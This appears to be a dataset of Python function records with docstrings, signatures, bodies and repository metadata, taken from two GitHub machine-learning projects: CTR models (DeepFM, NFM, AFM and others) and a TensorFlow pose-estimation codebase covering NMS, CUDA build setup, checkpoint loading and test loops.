{"docstring": "\"\"\"\n:param Xi: the same as fit function\n:param Xv: the same as fit function\n:return: output, ont-dim array\n\"\"\"\n", "func_signal": "def predict(self, Xi, Xv):\n", "code": "Xi = np.array(Xi).reshape((-1,self.field_size,1))\nXi = Variable(torch.LongTensor(Xi))\nXv = Variable(torch.FloatTensor(Xv))\nif self.use_cuda and torch.cuda.is_available():\n    Xi, Xv = Xi.cuda(), Xv.cuda()\n\nmodel = self.eval()\npred = F.sigmoid(model(Xi, Xv)).cpu()\nreturn (pred.data.numpy() > 0.5)", "path": "model\\DeepFM.py", "repo_name": "nzc/dnn_ctr", "stars": 755, "license": "None", "language": "python", "size": 43447}
{"docstring": "\"\"\"\n:param Xi: tensor of feature index\n:param Xv: tensor of feature value\n:param y: tensor of labels\n:return: metric of the evaluation\n\"\"\"\n", "func_signal": "def evaluate(self, Xi, Xv, y):\n", "code": "y_pred = self.inner_predict_proba(Xi, Xv)\nreturn self.eval_metric(y.cpu().data.numpy(), y_pred)", "path": "model\\AFM.py", "repo_name": "nzc/dnn_ctr", "stars": 755, "license": "None", "language": "python", "size": 43447}
{"docstring": "\"\"\"\n:param Xi: tensor of feature index\n:param Xv: tensor of feature value\n:return: output, numpy\n\"\"\"\n", "func_signal": "def inner_predict(self, Xi, Xv):\n", "code": "model = self.eval()\npred = F.sigmoid(model(Xi, Xv)).cpu()\nreturn (pred.data.numpy() > 0.5)", "path": "model\\NFM.py", "repo_name": "nzc/dnn_ctr", "stars": 755, "license": "None", "language": "python", "size": 43447}
{"docstring": "\"\"\"\n:param Xi: tensor of feature index\n:param Xv: tensor of feature value\n:return: output, numpy\n\"\"\"\n", "func_signal": "def inner_predict_proba(self, Xi, Xv):\n", "code": "model = self.eval()\npred = F.sigmoid(model(Xi, Xv)).cpu()\nreturn pred.data.numpy()", "path": "model\\NFM.py", "repo_name": "nzc/dnn_ctr", "stars": 755, "license": "None", "language": "python", "size": 43447}
{"docstring": "\"\"\"\n:param Xi: tensor of feature index\n:param Xv: tensor of feature value\n:param y: tensor of labels\n:return: metric of the evaluation\n\"\"\"\n", "func_signal": "def evaluate(self, Xi, Xv, y):\n", "code": "y_pred = self.inner_predict_proba(Xi, Xv)\nreturn self.eval_metric(y.cpu().data.numpy(), y_pred)", "path": "model\\NFM.py", "repo_name": "nzc/dnn_ctr", "stars": 755, "license": "None", "language": "python", "size": 43447}
{"docstring": "\"\"\"\n:param Xi: the same as fit function\n:param Xv: the same as fit function\n:return: output, ont-dim array\n\"\"\"\n", "func_signal": "def predict(self, Xi, Xv):\n", "code": "Xi = np.array(Xi).reshape((-1,self.field_size,1))\nXi = Variable(torch.LongTensor(Xi))\nXv = Variable(torch.FloatTensor(Xv))\nif self.use_cuda and torch.cuda.is_available():\n    Xi, Xv = Xi.cuda(), Xv.cuda()\n\nmodel = self.eval()\npred = F.sigmoid(model(Xi, Xv)).cpu()\nreturn (pred.data.numpy() > 0.5)", "path": "model\\FNN.py", "repo_name": "nzc/dnn_ctr", "stars": 755, "license": "None", "language": "python", "size": 43447}
{"docstring": "\"\"\"\n:param Xi: the same as fit function\n:param Xv: the same as fit function\n:return: output, ont-dim array\n\"\"\"\n", "func_signal": "def predict(self, Xi, Xv):\n", "code": "Xi = np.array(Xi).reshape((-1,self.field_size,1))\nXi = Variable(torch.LongTensor(Xi))\nXv = Variable(torch.FloatTensor(Xv))\nif self.use_cuda and torch.cuda.is_available():\n    Xi, Xv = Xi.cuda(), Xv.cuda()\n\nmodel = self.eval()\npred = F.sigmoid(model(Xi, Xv)).cpu()\nreturn (pred.data.numpy() > 0.5)", "path": "model\\AFM.py", "repo_name": "nzc/dnn_ctr", "stars": 755, "license": "None", "language": "python", "size": 43447}
{"docstring": "\"\"\"\n:param Xi: the same as fit function\n:param Xv: the same as fit function\n:return: output, ont-dim array\n\"\"\"\n", "func_signal": "def predict(self, Xi, Xv):\n", "code": "Xi = np.array(Xi).reshape((-1,self.field_size,1))\nXi = Variable(torch.LongTensor(Xi))\nXv = Variable(torch.FloatTensor(Xv))\nif self.use_cuda and torch.cuda.is_available():\n    Xi, Xv = Xi.cuda(), Xv.cuda()\n\nmodel = self.eval()\npred = F.sigmoid(model(Xi, Xv)).cpu()\nreturn (pred.data.numpy() > 0.5)", "path": "model\\PNN.py", "repo_name": "nzc/dnn_ctr", "stars": 755, "license": "None", "language": "python", "size": 43447}
{"docstring": "\"\"\"\n:param Xi: tensor of feature index\n:param Xv: tensor of feature value\n:param y: tensor of labels\n:return: metric of the evaluation\n\"\"\"\n", "func_signal": "def evaluate(self, Xi, Xv, y):\n", "code": "y_pred = self.inner_predict_proba(Xi, Xv)\nreturn self.eval_metric(y.cpu().data.numpy(), y_pred)", "path": "model\\PNN.py", "repo_name": "nzc/dnn_ctr", "stars": 755, "license": "None", "language": "python", "size": 43447}
{"docstring": "\"\"\"inject deep into distutils to customize how the dispatch\nto gcc/nvcc works.\n\nIf you subclass UnixCCompiler, it's not trivial to get your subclass\ninjected in, and still have the right customizations (i.e.\ndistutils.sysconfig.customize_compiler) run on it. So instead of going\nthe OO route, I have this. Note, it's kindof like a wierd functional\nsubclassing going on.\"\"\"\n\n# tell the compiler it can processes .cu\n", "func_signal": "def customize_compiler_for_nvcc(self):\n", "code": "self.src_extensions.append('.cu')\n\n# save references to the default compiler_so and _comple methods\ndefault_compiler_so = self.compiler_so\nsuper = self._compile\n\n# now redefine the _compile method. This gets executed for each\n# object but distutils doesn't have the ability to change compilers\n# based on source extension: we add it.\ndef _compile(obj, src, ext, cc_args, extra_postargs, pp_opts):\n    print(extra_postargs)\n    if os.path.splitext(src)[1] == '.cu':\n        # use the cuda for .cu files\n        self.set_executable('compiler_so', CUDA['nvcc'])\n        # use only a subset of the extra_postargs, which are 1-1 translated\n        # from the extra_compile_args in the Extension class\n        postargs = extra_postargs['nvcc']\n    else:\n        postargs = extra_postargs['gcc']\n\n    super(obj, src, ext, cc_args, postargs, pp_opts)\n    # reset the default compiler_so, which we might have changed for cuda\n    self.compiler_so = default_compiler_so\n\n# inject our redefined _compile method into the class\nself._compile = _compile", "path": "lib\\setup.py", "repo_name": "chenyilun95/tf-cpn", "stars": 789, "license": "mit", "language": "python", "size": 720}
{"docstring": "#TODO(global variables ?? how about _adam weights)\n", "func_signal": "def load_model(sess, model_path):\n", "code": "variables = tf.global_variables()\nvar_keep_dic = get_variables_in_checkpoint_file(model_path)\nif 'global_step' in var_keep_dic:\n    var_keep_dic.pop('global_step')\n\n# vis_var_keep_dic = []\nvariables_to_restore = []\nfor v in variables:\n    if v.name.split(':')[0] in var_keep_dic:\n        # print('Varibles restored: %s' % v.name)\n        variables_to_restore.append(v)\n        # vis_var_keep_dic.append(v.name.split(':')[0])\n    else:\n        # print('Unrestored Variables: %s' % v.name)\n        pass\n# print('Extra Variables in ckpt', set(var_keep_dic) - set(vis_var_keep_dic))\n\nif len(variables_to_restore) > 0:\n    restorer = tf.train.Saver(variables_to_restore)\n    restorer.restore(sess, model_path)\nelse:\n    print('No variables in {} fits the network'.format(model_path))", "path": "lib\\tfflat\\saver.py", "repo_name": "chenyilun95/tf-cpn", "stars": 789, "license": "mit", "language": "python", "size": 720}
{"docstring": "# here we assume all boxes are pre-processed.\n", "func_signal": "def test_net(tester, logger, dets, det_range):\n", "code": "nms_method = 'nms'\nnms_thresh = 1.\nmin_scores = 1e-10\nmin_box_size = 0.  # 8 ** 2\n\nall_res = []\ndump_results = []\n\nstart_time = time.time()\n\nimg_start = det_range[0]\nwhile img_start < det_range[1]:\n    img_end = img_start + 1\n    im_info = dets[img_start]\n    while img_end < det_range[1] and dets[img_end]['image_id'] == im_info['image_id']:\n        img_end += 1\n\n    test_data = dets[img_start:img_end]\n    img_start = img_end\n\n    iter_avg_cost_time = (time.time() - start_time) / (img_end - det_range[0])\n    print('ran %.ds >> << left %.ds' % (\n        iter_avg_cost_time * (img_end - det_range[0]), iter_avg_cost_time * (det_range[1] - img_end)))\n\n    all_res.append([])\n\n    # get box detections\n    cls_dets = np.zeros((len(test_data), 5), dtype=np.float32)\n    for i in range(len(test_data)):\n        bbox = np.asarray(test_data[i]['bbox'])\n        cls_dets[i, :4] = np.array([bbox[0], bbox[1], bbox[0] + bbox[2], bbox[1] + bbox[3]])\n        cls_dets[i, 4] = np.array(test_data[i]['score'])\n\n    # nms and filter\n    keep = np.where((cls_dets[:, 4] >= min_scores) &\n                    ((cls_dets[:, 3] - cls_dets[:, 1]) * (cls_dets[:, 2] - cls_dets[:, 0]) >= min_box_size))[0]\n    cls_dets = cls_dets[keep]\n    if len(cls_dets) > 0:\n        if nms_method == 'nms':\n            keep = gpu_nms(cls_dets, nms_thresh)\n        elif nms_method == 'soft':\n            keep = cpu_soft_nms(np.ascontiguousarray(cls_dets, dtype=np.float32), method=2)\n        else:\n            assert False\n    cls_dets = cls_dets[keep]\n    test_data = np.asarray(test_data)[keep]\n\n    if len(keep) == 0:\n        continue\n\n    # crop and detect keypoints\n    cls_skeleton = np.zeros((len(test_data), cfg.nr_skeleton, 3))\n    crops = np.zeros((len(test_data), 4))\n    cfg.batch_size = 32\n    batch_size = cfg.batch_size // 2\n    for test_id in range(0, len(test_data), batch_size):\n        start_id = test_id\n        end_id = min(len(test_data), test_id + batch_size)\n\n        test_imgs = []\n        details = []\n        for i in range(start_id, end_id):\n            test_img, detail = Preprocessing(test_data[i], stage='test')\n            test_imgs.append(test_img)\n            details.append(detail)\n\n        details = np.asarray(details)\n        feed = test_imgs\n        for i in range(end_id - start_id):\n            ori_img = test_imgs[i][0].transpose(1, 2, 0)\n            flip_img = cv2.flip(ori_img, 1)\n            feed.append(flip_img.transpose(2, 0, 1)[np.newaxis, ...])\n        feed = np.vstack(feed)\n\n        res = tester.predict_one([feed.transpose(0, 2, 3, 1).astype(np.float32)])[0]\n        res = res.transpose(0, 3, 1, 2)\n\n        for i in range(end_id - start_id):\n            fmp = res[end_id - start_id + i].transpose((1, 2, 0))\n            fmp = cv2.flip(fmp, 1)\n            fmp = list(fmp.transpose((2, 0, 1)))\n            for (q, w) in cfg.symmetry:\n                fmp[q], fmp[w] = fmp[w], fmp[q]\n            fmp = np.array(fmp)\n            res[i] += fmp\n            res[i] /= 2\n\n        for test_image_id in range(start_id, end_id):\n            r0 = res[test_image_id - start_id].copy()\n            r0 /= 255.\n            r0 += 0.5\n            for w in range(cfg.nr_skeleton):\n                res[test_image_id - start_id, w] /= np.amax(res[test_image_id - start_id, w])\n            border = 10\n            dr = np.zeros((cfg.nr_skeleton, cfg.output_shape[0] + 2 * border, cfg.output_shape[1] + 2 * border))\n            dr[:, border:-border, border:-border] = res[test_image_id - start_id][:cfg.nr_skeleton].copy()\n            for w in range(cfg.nr_skeleton):\n                dr[w] = cv2.GaussianBlur(dr[w], (21, 21), 0)\n            for w in range(cfg.nr_skeleton):\n                lb = dr[w].argmax()\n                y, x = np.unravel_index(lb, dr[w].shape)\n                dr[w, y, x] = 0\n                lb = dr[w].argmax()\n                py, px = np.unravel_index(lb, dr[w].shape)\n                y -= border\n                x -= border\n                py -= border + y\n                px -= border + x\n                ln = (px ** 2 + py ** 2) ** 0.5\n                delta = 0.25\n                if ln > 1e-3:\n                    x += delta * px / ln\n                    y += delta * py / ln\n                x = max(0, min(x, cfg.output_shape[1] - 1))\n                y = max(0, min(y, cfg.output_shape[0] - 1))\n                cls_skeleton[test_image_id, w, :2] = (x * 4 + 2, y * 4 + 2)\n                cls_skeleton[test_image_id, w, 2] = r0[w, int(round(y) + 1e-10), int(round(x) + 1e-10)]\n            # map back to original images\n            crops[test_image_id, :] = details[test_image_id - start_id, :]\n            for w in range(cfg.nr_skeleton):\n                cls_skeleton[test_image_id, w, 0] = cls_skeleton[test_image_id, w, 0] / cfg.data_shape[1] * (\n                crops[test_image_id][2] - crops[test_image_id][0]) + crops[test_image_id][0]\n                cls_skeleton[test_image_id, w, 1] = cls_skeleton[test_image_id, w, 1] / cfg.data_shape[0] * (\n                crops[test_image_id][3] - crops[test_image_id][1]) + crops[test_image_id][1]\n    all_res[-1] = [cls_skeleton.copy(), cls_dets.copy()]\n\n    cls_partsco = cls_skeleton[:, :, 2].copy().reshape(-1, cfg.nr_skeleton)\n    cls_skeleton[:, :, 2] = 1\n    cls_scores = cls_dets[:, -1].copy()\n\n    # rescore\n    cls_dets[:, -1] = cls_scores * cls_partsco.mean(axis=1)\n    cls_skeleton = np.concatenate(\n        [cls_skeleton.reshape(-1, cfg.nr_skeleton * 3), (cls_scores * cls_partsco.mean(axis=1))[:, np.newaxis]],\n        axis=1)\n    for i in range(len(cls_skeleton)):\n        result = dict(image_id=im_info['image_id'], category_id=1, score=float(round(cls_skeleton[i][-1], 4)),\n                      keypoints=cls_skeleton[i][:-1].round(3).tolist())\n        dump_results.append(result)\n\nreturn all_res, dump_results", "path": "models\\COCO.res101.384x288.CPN\\mptest.py", "repo_name": "chenyilun95/tf-cpn", "stars": 789, "license": "mit", "language": "python", "size": 720}
{"docstring": "\"\"\"\nReturn the boxes on image grid.\n\"\"\"\n\n# height and width of the heatmap\n", "func_signal": "def get_boxes_grid(image_height, image_width):\n", "code": "if cfg.NET_NAME == 'CaffeNet':\n  height = np.floor((image_height * max(cfg.TRAIN.SCALES) - 1) / 4.0 + 1)\n  height = np.floor((height - 1) / 2.0 + 1 + 0.5)\n  height = np.floor((height - 1) / 2.0 + 1 + 0.5)\n\n  width = np.floor((image_width * max(cfg.TRAIN.SCALES) - 1) / 4.0 + 1)\n  width = np.floor((width - 1) / 2.0 + 1 + 0.5)\n  width = np.floor((width - 1) / 2.0 + 1 + 0.5)\nelif cfg.NET_NAME == 'VGGnet':\n  height = np.floor(image_height * max(cfg.TRAIN.SCALES) / 2.0 + 0.5)\n  height = np.floor(height / 2.0 + 0.5)\n  height = np.floor(height / 2.0 + 0.5)\n  height = np.floor(height / 2.0 + 0.5)\n\n  width = np.floor(image_width * max(cfg.TRAIN.SCALES) / 2.0 + 0.5)\n  width = np.floor(width / 2.0 + 0.5)\n  width = np.floor(width / 2.0 + 0.5)\n  width = np.floor(width / 2.0 + 0.5)\nelse:\n  assert (1), 'The network architecture is not supported in utils.get_boxes_grid!'\n\n# compute the grid box centers\nh = np.arange(height)\nw = np.arange(width)\ny, x = np.meshgrid(h, w, indexing='ij')\ncenters = np.dstack((x, y))\ncenters = np.reshape(centers, (-1, 2))\nnum = centers.shape[0]\n\n# compute width and height of grid box\narea = cfg.TRAIN.KERNEL_SIZE * cfg.TRAIN.KERNEL_SIZE\naspect = cfg.TRAIN.ASPECTS  # height / width\nnum_aspect = len(aspect)\nwidths = np.zeros((1, num_aspect), dtype=np.float32)\nheights = np.zeros((1, num_aspect), dtype=np.float32)\nfor i in range(num_aspect):\n  widths[0, i] = math.sqrt(area / aspect[i])\n  heights[0, i] = widths[0, i] * aspect[i]\n\n# construct grid boxes\ncenters = np.repeat(centers, num_aspect, axis=0)\nwidths = np.tile(widths, num).transpose()\nheights = np.tile(heights, num).transpose()\n\nx1 = np.reshape(centers[:, 0], (-1, 1)) - widths * 0.5\nx2 = np.reshape(centers[:, 0], (-1, 1)) + widths * 0.5\ny1 = np.reshape(centers[:, 1], (-1, 1)) - heights * 0.5\ny2 = np.reshape(centers[:, 1], (-1, 1)) + heights * 0.5\n\nboxes_grid = np.hstack((x1, y1, x2, y2)) / cfg.TRAIN.SPATIAL_SCALE\n\nreturn boxes_grid, centers[:, 0], centers[:, 1]", "path": "lib\\utils\\boxes_grid.py", "repo_name": "chenyilun95/tf-cpn", "stars": 789, "license": "mit", "language": "python", "size": 720}
{"docstring": "\"\"\"Convert a list of images into a network input.\n\nAssumes images are already prepared (means subtracted, BGR order, ...).\n\"\"\"\n", "func_signal": "def im_list_to_blob(ims):\n", "code": "max_shape = np.array([im.shape for im in ims]).max(axis=0)\nnum_images = len(ims)\nblob = np.zeros((num_images, max_shape[0], max_shape[1], 3),\n                dtype=np.float32)\nfor i in range(num_images):\n  im = ims[i]\n  blob[i, 0:im.shape[0], 0:im.shape[1], :] = im\n\nreturn blob", "path": "lib\\utils\\blob.py", "repo_name": "chenyilun95/tf-cpn", "stars": 789, "license": "mit", "language": "python", "size": 720}
{"docstring": "# here we assume all boxes are pre-processed.\n", "func_signal": "def test_net(tester, logger, dets, det_range):\n", "code": "nms_method = 'nms'\nnms_thresh = 1.\nmin_scores = 1e-10\nmin_box_size = 0.  # 8 ** 2\n\nall_res = []\ndump_results = []\n\nstart_time = time.time()\n\nimg_start = det_range[0]\nwhile img_start < det_range[1]:\n    img_end = img_start + 1\n    im_info = dets[img_start]\n    while img_end < det_range[1] and dets[img_end]['image_id'] == im_info['image_id']:\n        img_end += 1\n\n    test_data = dets[img_start:img_end]\n    img_start = img_end\n\n    iter_avg_cost_time = (time.time() - start_time) / (img_end - det_range[0])\n    print('ran %.ds >> << left %.ds' % (\n        iter_avg_cost_time * (img_end - det_range[0]), iter_avg_cost_time * (det_range[1] - img_end)))\n\n    all_res.append([])\n\n    # get box detections\n    cls_dets = np.zeros((len(test_data), 5), dtype=np.float32)\n    for i in range(len(test_data)):\n        bbox = np.asarray(test_data[i]['bbox'])\n        cls_dets[i, :4] = np.array([bbox[0], bbox[1], bbox[0] + bbox[2], bbox[1] + bbox[3]])\n        cls_dets[i, 4] = np.array(test_data[i]['score'])\n\n    # nms and filter\n    keep = np.where((cls_dets[:, 4] >= min_scores) &\n                    ((cls_dets[:, 3] - cls_dets[:, 1]) * (cls_dets[:, 2] - cls_dets[:, 0]) >= min_box_size))[0]\n    cls_dets = cls_dets[keep]\n    if len(cls_dets) > 0:\n        if nms_method == 'nms':\n            keep = gpu_nms(cls_dets, nms_thresh)\n        elif nms_method == 'soft':\n            keep = cpu_soft_nms(np.ascontiguousarray(cls_dets, dtype=np.float32), method=2)\n        else:\n            assert False\n    cls_dets = cls_dets[keep]\n    test_data = np.asarray(test_data)[keep]\n\n    if len(keep) == 0:\n        continue\n\n    # crop and detect keypoints\n    cls_skeleton = np.zeros((len(test_data), cfg.nr_skeleton, 3))\n    crops = np.zeros((len(test_data), 4))\n    cfg.batch_size = 32\n    batch_size = cfg.batch_size // 2\n    for test_id in range(0, len(test_data), batch_size):\n        start_id = test_id\n        end_id = min(len(test_data), test_id + batch_size)\n\n        test_imgs = []\n        details = []\n        for i in range(start_id, end_id):\n            test_img, detail = Preprocessing(test_data[i], stage='test')\n            test_imgs.append(test_img)\n            details.append(detail)\n\n        details = np.asarray(details)\n        feed = test_imgs\n        for i in range(end_id - start_id):\n            ori_img = test_imgs[i][0].transpose(1, 2, 0)\n            flip_img = cv2.flip(ori_img, 1)\n            feed.append(flip_img.transpose(2, 0, 1)[np.newaxis, ...])\n        feed = np.vstack(feed)\n\n        res = tester.predict_one([feed.transpose(0, 2, 3, 1).astype(np.float32)])[0]\n        res = res.transpose(0, 3, 1, 2)\n\n        for i in range(end_id - start_id):\n            fmp = res[end_id - start_id + i].transpose((1, 2, 0))\n            fmp = cv2.flip(fmp, 1)\n            fmp = list(fmp.transpose((2, 0, 1)))\n            for (q, w) in cfg.symmetry:\n                fmp[q], fmp[w] = fmp[w], fmp[q]\n            fmp = np.array(fmp)\n            res[i] += fmp\n            res[i] /= 2\n\n        for test_image_id in range(start_id, end_id):\n            r0 = res[test_image_id - start_id].copy()\n            r0 /= 255.\n            r0 += 0.5\n            for w in range(cfg.nr_skeleton):\n                res[test_image_id - start_id, w] /= np.amax(res[test_image_id - start_id, w])\n            border = 10\n            dr = np.zeros((cfg.nr_skeleton, cfg.output_shape[0] + 2 * border, cfg.output_shape[1] + 2 * border))\n            dr[:, border:-border, border:-border] = res[test_image_id - start_id][:cfg.nr_skeleton].copy()\n            for w in range(cfg.nr_skeleton):\n                dr[w] = cv2.GaussianBlur(dr[w], (21, 21), 0)\n            for w in range(cfg.nr_skeleton):\n                lb = dr[w].argmax()\n                y, x = np.unravel_index(lb, dr[w].shape)\n                dr[w, y, x] = 0\n                lb = dr[w].argmax()\n                py, px = np.unravel_index(lb, dr[w].shape)\n                y -= border\n                x -= border\n                py -= border + y\n                px -= border + x\n                ln = (px ** 2 + py ** 2) ** 0.5\n                delta = 0.25\n                if ln > 1e-3:\n                    x += delta * px / ln\n                    y += delta * py / ln\n                x = max(0, min(x, cfg.output_shape[1] - 1))\n                y = max(0, min(y, cfg.output_shape[0] - 1))\n                cls_skeleton[test_image_id, w, :2] = (x * 4 + 2, y * 4 + 2)\n                cls_skeleton[test_image_id, w, 2] = r0[w, int(round(y) + 1e-10), int(round(x) + 1e-10)]\n            # map back to original images\n            crops[test_image_id, :] = details[test_image_id - start_id, :]\n            for w in range(cfg.nr_skeleton):\n                cls_skeleton[test_image_id, w, 0] = cls_skeleton[test_image_id, w, 0] / cfg.data_shape[1] * (\n                crops[test_image_id][2] - crops[test_image_id][0]) + crops[test_image_id][0]\n                cls_skeleton[test_image_id, w, 1] = cls_skeleton[test_image_id, w, 1] / cfg.data_shape[0] * (\n                crops[test_image_id][3] - crops[test_image_id][1]) + crops[test_image_id][1]\n    all_res[-1] = [cls_skeleton.copy(), cls_dets.copy()]\n\n    cls_partsco = cls_skeleton[:, :, 2].copy().reshape(-1, cfg.nr_skeleton)\n    cls_skeleton[:, :, 2] = 1\n    cls_scores = cls_dets[:, -1].copy()\n\n    # rescore\n    cls_dets[:, -1] = cls_scores * cls_partsco.mean(axis=1)\n    cls_skeleton = np.concatenate(\n        [cls_skeleton.reshape(-1, cfg.nr_skeleton * 3), (cls_scores * cls_partsco.mean(axis=1))[:, np.newaxis]],\n        axis=1)\n    for i in range(len(cls_skeleton)):\n        result = dict(image_id=im_info['image_id'], category_id=1, score=float(round(cls_skeleton[i][-1], 4)),\n                      keypoints=cls_skeleton[i][:-1].round(3).tolist())\n        dump_results.append(result)\n\nreturn all_res, dump_results", "path": "models\\COCO.res50.256x192.CPN\\mptest.py", "repo_name": "chenyilun95/tf-cpn", "stars": 789, "license": "mit", "language": "python", "size": 720}
{"docstring": "\"\"\"Mean subtract and scale an image for use in a blob.\"\"\"\n", "func_signal": "def prep_im_for_blob(im, pixel_means, target_size, max_size):\n", "code": "im = im.astype(np.float32, copy=False)\nim -= pixel_means\nim_shape = im.shape\nim_size_min = np.min(im_shape[0:2])\nim_size_max = np.max(im_shape[0:2])\nim_scale = float(target_size) / float(im_size_min)\n# Prevent the biggest axis from being more than MAX_SIZE\nif np.round(im_scale * im_size_max) > max_size:\n  im_scale = float(max_size) / float(im_size_max)\nim = cv2.resize(im, None, None, fx=im_scale, fy=im_scale,\n                interpolation=cv2.INTER_LINEAR)\n\nreturn im, im_scale", "path": "lib\\utils\\blob.py", "repo_name": "chenyilun95/tf-cpn", "stars": 789, "license": "mit", "language": "python", "size": 720}
{"docstring": "\"\"\"\nArgs:\n    ds (DataFlow): the dataflow to map\n    nr_proc(int): number of threads to use\n    map_func (callable): datapoint -> datapoint | None\n    buffer_size (int): number of datapoints in the buffer\n    strict (bool): use \"strict mode\", see notes above.\n\"\"\"\n", "func_signal": "def __init__(self, ds, nr_proc, map_func, buffer_size=200, strict=False):\n", "code": "_ParallelMapData.__init__(self, ds, buffer_size)\nself.nr_proc = nr_proc\nself.map_func = map_func\nself._strict = strict\nself._procs = []\nself._guard = DataFlowReentrantGuard()\n\nself._reset_done = False\nself._procs = []", "path": "lib\\tfflat\\data_provider.py", "repo_name": "chenyilun95/tf-cpn", "stars": 789, "license": "mit", "language": "python", "size": 720}
{"docstring": "\"\"\"inject deep into distutils to customize how the dispatch\nto gcc/nvcc works.\n\nIf you subclass UnixCCompiler, it's not trivial to get your subclass\ninjected in, and still have the right customizations (i.e.\ndistutils.sysconfig.customize_compiler) run on it. So instead of going\nthe OO route, I have this. Note, it's kindof like a wierd functional\nsubclassing going on.\"\"\"\n\n# tell the compiler it can processes .cu\n", "func_signal": "def customize_compiler_for_nvcc(self):\n", "code": "self.src_extensions.append('.cu')\n\n# save references to the default compiler_so and _comple methods\ndefault_compiler_so = self.compiler_so\nsuper = self._compile\n\n# now redefine the _compile method. This gets executed for each\n# object but distutils doesn't have the ability to change compilers\n# based on source extension: we add it.\ndef _compile(obj, src, ext, cc_args, extra_postargs, pp_opts):\n    if os.path.splitext(src)[1] == '.cu':\n        # use the cuda for .cu files\n        self.set_executable('compiler_so', CUDA['nvcc'])\n        # use only a subset of the extra_postargs, which are 1-1 translated\n        # from the extra_compile_args in the Extension class\n        postargs = extra_postargs['nvcc']\n    else:\n        postargs = extra_postargs['gcc']\n\n    super(obj, src, ext, cc_args, postargs, pp_opts)\n    # reset the default compiler_so, which we might have changed for cuda\n    self.compiler_so = default_compiler_so\n\n# inject our redefined _compile method into the class\nself._compile = _compile", "path": "lib\\lib_kernel\\lib_nms\\setup.py", "repo_name": "chenyilun95/tf-cpn", "stars": 789, "license": "mit", "language": "python", "size": 720}
{"docstring": "\"\"\"Calculate the average gradient for each shared variable across all towers.\nNote that this function provides a synchronization point across all towers.\nArgs:\n  tower_grads: List of lists of (gradient, variable) tuples. The outer list\n    is over individual gradients. The inner list is over the gradient\n    calculation for each tower.\nReturns:\n   List of pairs of (gradient, variable) where the gradient has been averaged\n   across all towers.\n\"\"\"\n", "func_signal": "def average_gradients(tower_grads):\n", "code": "average_grads = []\nfor grad_and_vars in zip(*tower_grads):\n    if grad_and_vars[0][0] is None:\n        print('No gradient on var {}'.format(grad_and_vars[0][1].name))\n        continue\n    # Note that each grad_and_vars looks like the following:\n    #   ((grad0_gpu0, var0_gpu0), ... , (grad0_gpuN, var0_gpuN))\n    grads = []\n    for g, _ in grad_and_vars:\n        # Add 0 dimension to the gradients to represent the tower.\n        expanded_g = tf.expand_dims(g, 0)\n\n        # Append on a 'tower' dimension which we will average over below.\n        grads.append(expanded_g)\n\n    # Average over the 'tower' dimension.\n    grad = tf.concat(axis=0, values=grads)\n    grad = tf.reduce_mean(grad, 0)\n\n    # Keep in mind that the Variables are redundant because they are shared\n    # across towers. So .. we will just return the first tower's pointer to\n    # the Variable.\n    v = grad_and_vars[0][1]\n    grad_and_var = (grad, v)\n    average_grads.append(grad_and_var)\nreturn average_grads", "path": "lib\\tfflat\\net_utils.py", "repo_name": "chenyilun95/tf-cpn", "stars": 789, "license": "mit", "language": "python", "size": 720}
{"docstring": "\"\"\"\nArgs:\n    ds (DataFlow): When ``use_list=False``, the components of ``ds``\n        must be either scalars or :class:`np.ndarray`, and have to be consistent in shapes.\n    batch_size(int): batch size\n    use_list (bool): if True, each component will contain a list\n        of datapoints instead of an numpy array of an extra dimension.\n\"\"\"\n", "func_signal": "def __init__(self, ds, batch_size, use_list=False):\n", "code": "self.ds = ds\nself.batch_size = int(batch_size)\nself.use_list = use_list", "path": "lib\\tfflat\\data_provider.py", "repo_name": "chenyilun95/tf-cpn", "stars": 789, "license": "mit", "language": "python", "size": 720}
{"docstring": "\"\"\"Locate the CUDA environment on the system\n\nReturns a dict with keys 'home', 'nvcc', 'include', and 'lib64'\nand values giving the absolute path to each directory.\n\nStarts by looking for the CUDAHOME env variable. If not found, everything\nis based on finding 'nvcc' in the PATH.\n\"\"\"\n\n# first check if the CUDAHOME env variable is in use\n", "func_signal": "def locate_cuda():\n", "code": "if 'CUDAHOME' in os.environ:\n    home = os.environ['CUDAHOME']\n    nvcc = pjoin(home, 'bin', 'nvcc')\nelse:\n    # otherwise, search the PATH for NVCC\n    default_path = pjoin(os.sep, 'usr', 'local', 'cuda', 'bin')\n    nvcc = find_in_path('nvcc', os.environ['PATH'] + os.pathsep + default_path)\n    if nvcc is None:\n        raise EnvironmentError('The nvcc binary could not be '\n            'located in your $PATH. Either add it to your path, or set $CUDAHOME')\n    home = os.path.dirname(os.path.dirname(nvcc))\n\ncudaconfig = {'home':home, 'nvcc':nvcc,\n              'include': pjoin(home, 'include'),\n              'lib64': pjoin(home, 'lib64')}\nfor k, v in cudaconfig.items():\n    if not os.path.exists(v):\n        raise EnvironmentError('The CUDA %s path could not be located in %s' % (k, v))\n\nreturn cudaconfig", "path": "lib\\setup.py", "repo_name": "chenyilun95/tf-cpn", "stars": 789, "license": "mit", "language": "python", "size": 720}
{"docstring": "\"\"\" inputs: list of (x0, y0, x1, y1, score)\"\"\"\n", "func_signal": "def execute(self, inputs, outputs):\n", "code": "in_ = inputs[0].get_value()\nkeep = gpu_nms(in_, thresh=self._iou_threshold)\noutputs[0].set_value(keep)", "path": "lib\\lib_kernel\\lib_nms\\nms_opr.py", "repo_name": "chenyilun95/tf-cpn", "stars": 789, "license": "mit", "language": "python", "size": 720}
{"docstring": "# here we assume all boxes are pre-processed.\n", "func_signal": "def test_net(tester, logger, dets, det_range):\n", "code": "nms_method = 'nms'\nnms_thresh = 1.\nmin_scores = 1e-10\nmin_box_size = 0.  # 8 ** 2\n\nall_res = []\ndump_results = []\n\nstart_time = time.time()\n\nimg_start = det_range[0]\nwhile img_start < det_range[1]:\n    img_end = img_start + 1\n    im_info = dets[img_start]\n    while img_end < det_range[1] and dets[img_end]['image_id'] == im_info['image_id']:\n        img_end += 1\n\n    test_data = dets[img_start:img_end]\n    img_start = img_end\n\n    iter_avg_cost_time = (time.time() - start_time) / (img_end - det_range[0])\n    print('ran %.ds >> << left %.ds' % (\n        iter_avg_cost_time * (img_end - det_range[0]), iter_avg_cost_time * (det_range[1] - img_end)))\n\n    all_res.append([])\n\n    # get box detections\n    cls_dets = np.zeros((len(test_data), 5), dtype=np.float32)\n    for i in range(len(test_data)):\n        bbox = np.asarray(test_data[i]['bbox'])\n        cls_dets[i, :4] = np.array([bbox[0], bbox[1], bbox[0] + bbox[2], bbox[1] + bbox[3]])\n        cls_dets[i, 4] = np.array(test_data[i]['score'])\n\n    # nms and filter\n    keep = np.where((cls_dets[:, 4] >= min_scores) &\n                    